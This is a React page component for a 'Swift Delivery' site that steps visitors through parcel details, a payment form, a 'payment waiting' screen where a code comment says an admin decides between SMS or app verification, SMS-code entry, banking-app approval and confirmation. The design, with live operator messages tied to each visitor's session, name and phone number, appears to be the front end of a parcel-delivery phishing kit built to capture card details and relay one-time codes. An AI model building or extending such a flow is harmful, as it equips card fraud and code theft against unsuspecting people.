import Header from "@/components/Header";
import StepIndicator from "@/components/StepIndicator";
import ParcelDetails from "@/components/ParcelDetails";
import PaymentForm from "@/components/PaymentForm";
import PaymentWaiting from "@/components/PaymentWaiting";
import SmsVerification from "@/components/SmsVerification";
import AppApproval from "@/components/AppApproval";
import SmsConfirmation from "@/components/SmsConfirmation";
import AdminAlert from "@/components/AdminAlert";
import { useClientSession } from "@/hooks/useClientSession";
import { RefreshCw } from "lucide-react";

const steps = ["Parcel", "Payment", "Verification", "Confirmation"];

const Index = () => {
  const { 
    session, 
    currentStep, 
    adminMessage, 
    messageType, 
    verificationCode,
    approvalType,
    loading, 
    updateStep,
    updateVerificationCode,
    clearAdminMessage 
  } = useClientSession();

  const handleProceedToPayment = () => {
    updateStep(2);
  };

  const handleProceedToWaiting = () => {
    // Move to waiting state - admin will decide SMS or App
    updateStep(2, { approval_type: "payment_waiting", verification_code: null });
  };

  const handleProceedToConfirmation = () => {
    updateStep(4);
  };

  const handleBack = () => {
    updateStep(Math.max(1, currentStep - 1));
  };

  const handleReset = () => {
    updateStep(1);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <RefreshCw className="w-8 h-8 animate-spin text-primary" />
      </div>
    );
  }

  // Determine what to show based on step and approval_type
  const isPaymentWaiting = currentStep === 2 && approvalType === "payment_waiting";
  const isAppApproval = currentStep === 3 && approvalType === "app_pending";
  const isSmsVerification = currentStep === 3 && approvalType !== "app_pending";

  return (
    <div className="min-h-screen bg-background">
      <Header />
      
      {/* Session indicator for demo */}
      {session && (
        <div className="bg-muted border-b border-border">
          <div className="container mx-auto px-4 py-2 text-center">
            <span className="text-sm text-muted-foreground">
              Session: <span className="font-mono font-medium text-foreground">#{session.session_code}</span>
            </span>
          </div>
        </div>
      )}
      
      <main className="container mx-auto px-4 py-8">
        {/* Admin Alert - show only when not on specific pages that handle their own alerts */}
        {adminMessage && !isPaymentWaiting && !isAppApproval && !isSmsVerification && (
          <AdminAlert 
            message={adminMessage} 
            type={messageType} 
            onDismiss={clearAdminMessage}
          />
        )}

        <StepIndicator currentStep={currentStep} steps={steps} />

        {currentStep === 1 && (
          <ParcelDetails onProceed={handleProceedToPayment} />
        )}

        {currentStep === 2 && !isPaymentWaiting && (
          <PaymentForm onProceed={handleProceedToWaiting} onBack={handleBack} />
        )}

        {isPaymentWaiting && session && (
          <PaymentWaiting 
            sessionCode={session.session_code}
            clientName={session.client_name}
            adminMessage={adminMessage}
            messageType={messageType}
            onDismissMessage={clearAdminMessage}
          />
        )}

        {isAppApproval && session && (
          <AppApproval 
            sessionCode={session.session_code}
            clientName={session.client_name}
            phoneNumber={session.phone_number}
            adminMessage={adminMessage}
            messageType={messageType}
            onDismissMessage={clearAdminMessage}
          />
        )}

        {isSmsVerification && session && (
          <SmsVerification 
            onBack={handleBack} 
            sessionCode={session.session_code}
            clientName={session.client_name}
            phoneNumber={session.phone_number}
            adminMessage={adminMessage}
            messageType={messageType}
            onDismissMessage={clearAdminMessage}
          />
        )}

        {currentStep === 4 && (
          <SmsConfirmation onReset={handleReset} />
        )}
      </main>

      <footer className="py-6 text-center text-sm text-muted-foreground">
        <p>© 2026 Swift Delivery. Secure payments powered by your gateway.</p>
      </footer>
    </div>
  );
};

export default Index;
